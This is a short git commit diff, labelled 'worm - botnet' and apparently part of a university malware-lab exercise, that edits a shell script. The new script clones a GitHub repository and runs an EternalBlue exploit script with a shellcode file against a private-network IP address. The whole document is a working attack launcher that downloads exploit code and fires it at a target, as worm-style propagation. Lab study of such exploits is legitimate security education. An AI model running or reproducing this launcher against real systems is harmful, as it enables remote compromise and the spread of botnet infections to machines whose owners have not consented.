9fdd7f4341ea85eebc531899c7949a3933613439
Kali <xkhangsama@gmail.com>
2021-06-14 17:10:43 -0400

    worm - botnet

--- shell_script.sh
+++ shell_script.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
-git clone https://github.com/ITLTVPo/NT230.L21.ANTN.git
-cd NT230.L21.ANTN
-python eternalblue_exploit7.py 192.168.111.132 shellcode.bin
+git clone https://github.com/xkhangsama/Lab4CoCheMaDoc.git
+cd Lab4CoCheMaDoc
+python eternalblue_exploit7.py 192.168.69.141 shellcode.bin
 
 
